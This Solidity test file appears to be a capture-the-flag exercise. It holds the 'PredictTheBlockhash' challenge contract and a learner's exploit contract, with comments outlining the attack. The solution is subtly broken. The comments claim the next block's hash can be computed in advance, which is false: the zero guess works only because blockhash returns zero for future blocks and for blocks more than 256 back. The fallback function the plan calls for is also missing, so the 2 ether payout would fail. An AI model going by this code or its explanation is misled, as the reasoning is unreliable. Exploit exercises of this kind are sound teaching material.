// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";

//Challenge
contract PredictTheBlockhash {
    address guesser;
    bytes32 guess;
    uint256 settlementBlockNumber;

    constructor() payable {
        require(
            msg.value == 1 ether,
            "Requires 1 ether to create this contract"
        );
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(bytes32 hash) public payable {
        require(guesser == address(0), "Requires guesser to be zero address");
        require(msg.value == 1 ether, "Requires msg.value to be 1 ether");

        guesser = msg.sender;
        guess = hash;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser, "Requires msg.sender to be guesser");
        require(
            block.number > settlementBlockNumber,
            "Requires block.number to be more than settlementBlockNumber"
        );
        console.log("settlementBlockNumber",settlementBlockNumber);
        bytes32 answer = blockhash(settlementBlockNumber);
        guesser = address(0);
        console.logBytes32(guess);
        console.logBytes32(answer);
        if (guess == answer) {
            (bool ok, ) = msg.sender.call{value: 2 ether}("");
            require(ok, "Transfer to msg.sender failed");
        }
    }
}

// Write your exploit contract below
/**
    1. add fallback funtion in the ExploitContract, make sure this contract can receive the eth
    2. Calculated the blockhash of next block.number, Just make sure the  next block.number greater than the beginning block number. For simplicity there just add one.
    3. set the guess as this blockhash   when call the  PredictTheBlockhash.   lockInGuess(bytes32 hash)
    4. call settle()
*/

contract ExploitContract {
    PredictTheBlockhash public predictTheBlockhash;
    bytes32 answer;

    constructor(PredictTheBlockhash _predictTheBlockhash) {
        predictTheBlockhash = _predictTheBlockhash;
    }

    // set the guess in first block number 
    function setGuess() public {
        answer = blockhash(block.number+1);
        predictTheBlockhash.lockInGuess{value: 1 ether}(answer);
    }

    // write your exploit code below
    // exploit the challenge in the next block number
    function exploit() public {
        predictTheBlockhash.settle();
    }
  
}